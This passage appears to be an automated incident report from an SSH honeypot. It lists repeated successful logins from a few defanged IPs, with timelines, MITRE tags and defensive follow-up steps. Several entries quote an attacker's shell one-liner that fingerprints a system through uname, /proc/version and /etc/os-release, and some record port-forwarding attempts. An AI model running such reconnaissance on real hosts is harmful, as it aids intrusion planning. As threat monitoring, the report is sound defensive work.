| `2026-08-11 05:48:21` | `cowrie.login.success` |
| `2026-08-11 05:48:22` | `cowrie.session.params` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.failed` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.failed` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.failed` |
| `2026-08-11 05:48:24` | `cowrie.command.input` |
| `2026-08-11 05:48:24` | `cowrie.command.failed` |
| `2026-08-11 05:48:24` | `cowrie.command.input` |
| `2026-08-11 05:48:24` | `cowrie.command.input` |
| `2026-08-11 05:48:24` | `cowrie.command.failed` |
| `2026-08-11 05:48:24` | `cowrie.command.failed` |
| `2026-08-11 05:48:55` | `cowrie.log.closed` |
| `2026-08-11 05:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a6ca634e63

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-11 05:48 |
| **Last Seen** | 2026-08-11 05:49 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:48:56` | `cowrie.session.connect` |
| `2026-08-11 05:48:57` | `cowrie.login.success` |
| `2026-08-11 05:48:57` | `cowrie.session.params` |
| `2026-08-11 05:48:58` | `cowrie.command.input` |
| `2026-08-11 05:48:58` | `cowrie.command.failed` |
| `2026-08-11 05:48:58` | `cowrie.command.input` |
| `2026-08-11 05:48:58` | `cowrie.command.failed` |
| `2026-08-11 05:48:58` | `cowrie.command.input` |
| `2026-08-11 05:48:58` | `cowrie.command.failed` |
| `2026-08-11 05:48:59` | `cowrie.command.input` |
| `2026-08-11 05:48:59` | `cowrie.command.failed` |
| `2026-08-11 05:48:59` | `cowrie.command.input` |
| `2026-08-11 05:48:59` | `cowrie.command.input` |
| `2026-08-11 05:48:59` | `cowrie.command.failed` |
| `2026-08-11 05:48:59` | `cowrie.command.failed` |
| `2026-08-11 05:49:29` | `cowrie.log.closed` |
| `2026-08-11 05:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ff524410165

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-11 05:49 |
| **Last Seen** | 2026-08-11 05:50 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:49:30` | `cowrie.session.connect` |
| `2026-08-11 05:49:31` | `cowrie.login.success` |
| `2026-08-11 05:49:31` | `cowrie.session.params` |
| `2026-08-11 05:49:32` | `cowrie.command.input` |
| `2026-08-11 05:49:32` | `cowrie.command.failed` |
| `2026-08-11 05:49:32` | `cowrie.command.input` |
| `2026-08-11 05:49:32` | `cowrie.command.failed` |
| `2026-08-11 05:49:32` | `cowrie.command.input` |
| `2026-08-11 05:49:32` | `cowrie.command.failed` |
| `2026-08-11 05:49:33` | `cowrie.command.input` |
| `2026-08-11 05:49:33` | `cowrie.command.failed` |
| `2026-08-11 05:49:33` | `cowrie.command.input` |
| `2026-08-11 05:49:33` | `cowrie.command.input` |
| `2026-08-11 05:49:33` | `cowrie.command.failed` |
| `2026-08-11 05:49:33` | `cowrie.command.failed` |
| `2026-08-11 05:50:04` | `cowrie.log.closed` |
| `2026-08-11 05:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08095bf513f4

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-11 05:50 |
| **Last Seen** | 2026-08-11 05:50 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:50:05` | `cowrie.session.connect` |
| `2026-08-11 05:50:05` | `cowrie.login.success` |
| `2026-08-11 05:50:06` | `cowrie.session.params` |
| `2026-08-11 05:50:06` | `cowrie.command.input` |
| `2026-08-11 05:50:06` | `cowrie.command.failed` |
| `2026-08-11 05:50:07` | `cowrie.command.input` |
| `2026-08-11 05:50:07` | `cowrie.command.failed` |
| `2026-08-11 05:50:07` | `cowrie.command.input` |
| `2026-08-11 05:50:07` | `cowrie.command.failed` |
| `2026-08-11 05:50:08` | `cowrie.command.input` |
| `2026-08-11 05:50:08` | `cowrie.command.failed` |
| `2026-08-11 05:50:08` | `cowrie.command.input` |
| `2026-08-11 05:50:08` | `cowrie.command.input` |
| `2026-08-11 05:50:08` | `cowrie.command.failed` |
| `2026-08-11 05:50:08` | `cowrie.command.failed` |
| `2026-08-11 05:50:38` | `cowrie.log.closed` |
| `2026-08-11 05:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50d9f38921d4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:50 |
| **Last Seen** | 2026-08-11 05:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:50:18` | `cowrie.session.connect` |
| `2026-08-11 05:50:18` | `cowrie.client.version` |
| `2026-08-11 05:50:18` | `cowrie.client.kex` |
| `2026-08-11 05:50:19` | `cowrie.login.success` |
| `2026-08-11 05:50:19` | `cowrie.session.params` |
| `2026-08-11 05:50:19` | `cowrie.command.input` |
| `2026-08-11 05:50:19` | `cowrie.command.input` |
| `2026-08-11 05:50:19` | `cowrie.command.input` |
| `2026-08-11 05:50:19` | `cowrie.command.input` |
| `2026-08-11 05:50:19` | `cowrie.command.input` |
| `2026-08-11 05:50:19` | `cowrie.command.success` |
| `2026-08-11 05:50:19` | `cowrie.command.input` |
| `2026-08-11 05:50:20` | `cowrie.command.input` |
| `2026-08-11 05:50:20` | `cowrie.command.input` |
| `2026-08-11 05:50:20` | `cowrie.command.input` |
| `2026-08-11 05:50:20` | `cowrie.log.closed` |
| `2026-08-11 05:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b218bfc2a9b

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-11 05:50 |
| **Last Seen** | 2026-08-11 05:51 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:50:39` | `cowrie.session.connect` |
| `2026-08-11 05:50:39` | `cowrie.login.success` |
| `2026-08-11 05:50:40` | `cowrie.login.success` |
| `2026-08-11 05:50:41` | `cowrie.session.params` |
| `2026-08-11 05:50:41` | `cowrie.command.input` |
| `2026-08-11 05:50:41` | `cowrie.command.failed` |
| `2026-08-11 05:50:42` | `cowrie.command.input` |
| `2026-08-11 05:50:42` | `cowrie.command.failed` |
| `2026-08-11 05:50:42` | `cowrie.command.input` |
| `2026-08-11 05:50:42` | `cowrie.command.input` |
| `2026-08-11 05:50:42` | `cowrie.command.failed` |
| `2026-08-11 05:50:42` | `cowrie.command.failed` |
| `2026-08-11 05:51:12` | `cowrie.log.closed` |
| `2026-08-11 05:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5cbd8c0d813

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-11 05:51 |
| **Last Seen** | 2026-08-11 05:51 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:51:13` | `cowrie.session.connect` |
| `2026-08-11 05:51:13` | `cowrie.login.success` |
| `2026-08-11 05:51:14` | `cowrie.login.success` |
| `2026-08-11 05:51:15` | `cowrie.session.params` |
| `2026-08-11 05:51:15` | `cowrie.command.input` |
| `2026-08-11 05:51:15` | `cowrie.command.failed` |
| `2026-08-11 05:51:16` | `cowrie.command.input` |
| `2026-08-11 05:51:16` | `cowrie.command.failed` |
| `2026-08-11 05:51:16` | `cowrie.command.input` |
| `2026-08-11 05:51:16` | `cowrie.command.input` |
| `2026-08-11 05:51:16` | `cowrie.command.failed` |
| `2026-08-11 05:51:16` | `cowrie.command.failed` |
| `2026-08-11 05:51:46` | `cowrie.log.closed` |
| `2026-08-11 05:51:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b53e97fa5828

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:52 |
| **Last Seen** | 2026-08-11 05:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:52:16` | `cowrie.session.connect` |
| `2026-08-11 05:52:16` | `cowrie.client.version` |
| `2026-08-11 05:52:16` | `cowrie.client.kex` |
| `2026-08-11 05:52:17` | `cowrie.login.success` |
| `2026-08-11 05:52:18` | `cowrie.session.params` |
| `2026-08-11 05:52:18` | `cowrie.command.input` |
| `2026-08-11 05:52:18` | `cowrie.command.input` |
| `2026-08-11 05:52:18` | `cowrie.command.input` |
| `2026-08-11 05:52:18` | `cowrie.command.input` |
| `2026-08-11 05:52:18` | `cowrie.command.input` |
| `2026-08-11 05:52:18` | `cowrie.command.success` |
| `2026-08-11 05:52:18` | `cowrie.command.input` |
| `2026-08-11 05:52:18` | `cowrie.command.input` |
| `2026-08-11 05:52:18` | `cowrie.command.input` |
| `2026-08-11 05:52:18` | `cowrie.command.input` |
| `2026-08-11 05:52:18` | `cowrie.log.closed` |
| `2026-08-11 05:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05290556c2f9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:54 |
| **Last Seen** | 2026-08-11 05:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:54:18` | `cowrie.session.connect` |
| `2026-08-11 05:54:18` | `cowrie.client.version` |
| `2026-08-11 05:54:18` | `cowrie.client.kex` |
| `2026-08-11 05:54:18` | `cowrie.login.success` |
| `2026-08-11 05:54:19` | `cowrie.session.params` |
| `2026-08-11 05:54:19` | `cowrie.command.input` |
| `2026-08-11 05:54:19` | `cowrie.command.input` |
| `2026-08-11 05:54:19` | `cowrie.command.input` |
| `2026-08-11 05:54:19` | `cowrie.command.input` |
| `2026-08-11 05:54:19` | `cowrie.command.input` |
| `2026-08-11 05:54:19` | `cowrie.command.success` |
| `2026-08-11 05:54:19` | `cowrie.command.input` |
| `2026-08-11 05:54:19` | `cowrie.command.input` |
| `2026-08-11 05:54:19` | `cowrie.command.input` |
| `2026-08-11 05:54:19` | `cowrie.command.input` |
| `2026-08-11 05:54:19` | `cowrie.log.closed` |
| `2026-08-11 05:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5955a25612dc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-11 05:55 |
| **Last Seen** | 2026-08-11 05:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:55:04` | `cowrie.session.connect` |
| `2026-08-11 05:55:04` | `cowrie.client.version` |
| `2026-08-11 05:55:04` | `cowrie.client.kex` |
| `2026-08-11 05:55:05` | `cowrie.login.success` |
| `2026-08-11 05:55:05` | `cowrie.direct-tcpip.request` |
| `2026-08-11 05:55:05` | `cowrie.direct-tcpip.data` |
| `2026-08-11 05:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14757c205a59

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:56 |
| **Last Seen** | 2026-08-11 05:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:56:21` | `cowrie.session.connect` |
| `2026-08-11 05:56:21` | `cowrie.client.version` |
| `2026-08-11 05:56:22` | `cowrie.client.kex` |
| `2026-08-11 05:56:22` | `cowrie.login.success` |
| `2026-08-11 05:56:23` | `cowrie.session.params` |
| `2026-08-11 05:56:23` | `cowrie.command.input` |
| `2026-08-11 05:56:23` | `cowrie.command.input` |
| `2026-08-11 05:56:23` | `cowrie.command.input` |
| `2026-08-11 05:56:23` | `cowrie.command.input` |
| `2026-08-11 05:56:23` | `cowrie.command.input` |
| `2026-08-11 05:56:23` | `cowrie.command.success` |
| `2026-08-11 05:56:23` | `cowrie.command.input` |
| `2026-08-11 05:56:23` | `cowrie.command.input` |
| `2026-08-11 05:56:23` | `cowrie.command.input` |
| `2026-08-11 05:56:23` | `cowrie.command.input` |
| `2026-08-11 05:56:23` | `cowrie.log.closed` |
| `2026-08-11 05:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7b4aba06462

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:58 |
| **Last Seen** | 2026-08-11 05:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:58:20` | `cowrie.session.connect` |
| `2026-08-11 05:58:20` | `cowrie.client.version` |
| `2026-08-11 05:58:20` | `cowrie.client.kex` |
| `2026-08-11 05:58:21` | `cowrie.login.success` |
| `2026-08-11 05:58:22` | `cowrie.session.params` |
| `2026-08-11 05:58:22` | `cowrie.command.input` |
| `2026-08-11 05:58:22` | `cowrie.command.input` |
| `2026-08-11 05:58:22` | `cowrie.command.input` |
| `2026-08-11 05:58:22` | `cowrie.command.input` |
| `2026-08-11 05:58:22` | `cowrie.command.input` |
| `2026-08-11 05:58:22` | `cowrie.command.success` |
| `2026-08-11 05:58:22` | `cowrie.command.input` |
| `2026-08-11 05:58:22` | `cowrie.command.input` |
| `2026-08-11 05:58:22` | `cowrie.command.input` |
| `2026-08-11 05:58:22` | `cowrie.command.input` |
| `2026-08-11 05:58:22` | `cowrie.log.closed` |
| `2026-08-11 05:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a26f4b463d88

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 06:00 |
| **Last Seen** | 2026-08-11 06:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:00:22` | `cowrie.session.connect` |
| `2026-08-11 06:00:22` | `cowrie.client.version` |
| `2026-08-11 06:00:22` | `cowrie.client.kex` |
| `2026-08-11 06:00:23` | `cowrie.login.success` |
| `2026-08-11 06:00:24` | `cowrie.session.params` |
| `2026-08-11 06:00:24` | `cowrie.command.input` |
| `2026-08-11 06:00:24` | `cowrie.command.input` |
| `2026-08-11 06:00:24` | `cowrie.command.input` |
| `2026-08-11 06:00:24` | `cowrie.command.input` |
| `2026-08-11 06:00:24` | `cowrie.command.input` |
| `2026-08-11 06:00:24` | `cowrie.command.success` |
| `2026-08-11 06:00:24` | `cowrie.command.input` |
| `2026-08-11 06:00:24` | `cowrie.command.input` |
| `2026-08-11 06:00:24` | `cowrie.command.input` |
| `2026-08-11 06:00:24` | `cowrie.command.input` |
| `2026-08-11 06:00:24` | `cowrie.log.closed` |
| `2026-08-11 06:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3390118c8d11

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-08-11 06:01 |
| **Last Seen** | 2026-08-11 06:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:01:44` | `cowrie.session.connect` |
| `2026-08-11 06:01:44` | `cowrie.client.version` |
| `2026-08-11 06:01:44` | `cowrie.client.kex` |
| `2026-08-11 06:01:46` | `cowrie.login.success` |
| `2026-08-11 06:01:46` | `cowrie.direct-tcpip.request` |
| `2026-08-11 06:01:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f51d5604e788

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 06:02 |
| **Last Seen** | 2026-08-11 06:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:02:20` | `cowrie.session.connect` |
| `2026-08-11 06:02:20` | `cowrie.client.version` |
| `2026-08-11 06:02:20` | `cowrie.client.kex` |
| `2026-08-11 06:02:21` | `cowrie.login.success` |
| `2026-08-11 06:02:22` | `cowrie.session.params` |
| `2026-08-11 06:02:22` | `cowrie.command.input` |
| `2026-08-11 06:02:22` | `cowrie.command.input` |
| `2026-08-11 06:02:22` | `cowrie.command.input` |
| `2026-08-11 06:02:22` | `cowrie.command.input` |
| `2026-08-11 06:02:22` | `cowrie.command.input` |
| `2026-08-11 06:02:22` | `cowrie.command.success` |
| `2026-08-11 06:02:22` | `cowrie.command.input` |
| `2026-08-11 06:02:22` | `cowrie.command.input` |
| `2026-08-11 06:02:22` | `cowrie.command.input` |
| `2026-08-11 06:02:22` | `cowrie.command.input` |
| `2026-08-11 06:02:22` | `cowrie.log.closed` |
| `2026-08-11 06:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f17ffca58d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 06:04 |
| **Last Seen** | 2026-08-11 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
